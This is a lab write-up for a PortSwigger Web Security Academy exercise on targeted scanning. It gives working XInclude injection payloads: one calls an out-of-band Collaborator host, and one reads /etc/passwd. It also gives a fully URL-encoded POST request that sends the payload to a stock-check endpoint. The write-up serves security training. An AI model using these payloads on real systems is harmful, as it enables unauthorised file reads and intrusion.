
# 23 - Discovering vulnerabilities quickly with targeted scanning

This lab contains a vulnerability that enables you to read arbitrary files from the server. To solve the lab, retrieve the contents of /etc/passwd within 10 minutes.

Due to the tight time limit, we recommend using Burp Scanner to help you. You can obviously scan the entire site to identify the vulnerability, but this might not leave you enough time to solve the lab. Instead, use your intuition to identify endpoints that are likely to be vulnerable, then try running a targeted scan on a specific request. Once Burp Scanner has identified an attack vector, you can use your own expertise to find a way to exploit it.

Hint: If you get stuck, try looking up our Academy topic on the identified vulnerability class.


---------------------------------------------

References: 

- https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing

- https://portswigger.net/web-security/xxe



![img](images/23%20-%20Discovering%20vulnerabilities%20quickly%20with%20targeted%20scanning/1.png)

---------------------------------------------

Generated link: 



![img](images/23%20-%20Discovering%20vulnerabilities%20quickly%20with%20targeted%20scanning/2.png)

We know this payload works:

```
<njd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://itfjkky610emxm8w1amzh40dm4sygp4qsif83x.oastify.com/foo"/></njd>
```

So we will try:

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

The POST request will be:

```
POST /product/stock HTTP/2
...

productId=%3c%66%6f%6f%20%78%6d%6c%6e%73%3a%78%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%49%6e%63%6c%75%64%65%22%3e%3c%78%69%3a%69%6e%63%6c%75%64%65%20%70%61%72%73%65%3d%22%74%65%78%74%22%20%68%72%65%66%3d%22%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%2f%3e%3c%2f%66%6f%6f%3e&storeId=1
```



![img](images/23%20-%20Discovering%20vulnerabilities%20quickly%20with%20targeted%20scanning/3.png)



![img](images/23%20-%20Discovering%20vulnerabilities%20quickly%20with%20targeted%20scanning/4.png)